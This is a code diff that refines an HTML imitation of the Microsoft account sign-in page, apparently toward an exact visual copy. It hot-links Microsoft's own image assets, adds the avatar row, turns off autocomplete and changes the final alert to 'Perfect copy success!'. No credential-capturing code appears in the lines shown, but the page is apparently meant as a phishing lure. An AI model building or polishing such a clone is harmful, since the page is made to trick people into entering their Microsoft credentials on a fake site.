@@ -20,19 +20,23 @@
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
             margin-bottom: 28px; min-height: 376px;
         }
-        /* THE FIXED LOGO: Now includes the "Microsoft" text lockup */
         .ms-logo {
             width: 108px; height: auto;
             margin-bottom: 24px; display: block;
         }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; }
+        
+        /* Fixed Identity Row with Avatar */
         .identity-container {
             display: flex; align-items: center;
-            padding: 4px; margin-bottom: 12px;
-            cursor: pointer; border-radius: 2px; margin-left: -8px;
+            padding: 2px 4px; margin-bottom: 16px;
+            cursor: pointer; border-radius: 2px; margin-left: -4px;
         }
         .identity-container:hover { background-color: rgba(0,0,0,0.05); }
-        .back-btn-img { width: 24px; height: 24px; margin-right: 8px; }
+        .back-btn-img { width: 20px; height: 20px; margin-right: 8px; }
+        .user-avatar { width: 20px; height: 20px; margin-right: 8px; border-radius: 50%; }
+        #display-email { font-size: 15px; color: #1b1b1b; }
+
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
             padding: 8px 0; font-size: 16px; margin-bottom: 12px;
@@ -45,7 +49,7 @@
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
             background-color: #0067b8; color: #fff; border: none;
-            padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
+            padding: 7px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
         }
         .btn-next:hover { background-color: #005da6; }
         .options-box {
@@ -53,7 +57,7 @@
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
             display: flex; align-items: center; cursor: pointer;
         }
-        .key-icon { width: 28px; height: 28px; margin-right: 12px; opacity: 0.7; }
+        .key-icon { width: 24px; height: 24px; margin-right: 12px; opacity: 0.6; }
         .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
         .footer a, .footer span { margin-left: 24px; text-decoration: none; color: #000; cursor: pointer; }
     </style>
@@ -65,7 +69,7 @@
             
             <div id="email-section">
                 <h1>Sign in</h1>
-                <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" spellcheck="false">
+                <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" spellcheck="false" autocomplete="off">
                 <p class="help-text">No account? <a href="#">Create one!</a></p>
                 <p class="help-text"><a href="#">Can’t access your account?</a></p>
                 <div class="button-row"><button class="btn-next" onclick="showPassword()">Next</button></div>
@@ -74,6 +78,7 @@
             <div id="password-section" style="display: none;">
                 <div class="identity-container" onclick="showEmail()">
                     <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.svg" class="back-btn-img" alt="Back">
+                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/user_6683a54f0545f4457e5b778733f3883a.svg" class="user-avatar" alt="User">
                     <div id="display-email"></div>
                 </div>
                 <h1>Enter password</h1>
@@ -103,9 +108,8 @@
         function showEmail() {
             document.getElementById('password-section').style.display = 'none';
             document.getElementById('email-section').style.display = 'block';
-            document.getElementById('user-email').focus();
         }
-        function finishLogin() { alert("Login successful!"); }
+        function finishLogin() { alert("Perfect copy success!"); }
     </script>
 </body>
 </html>
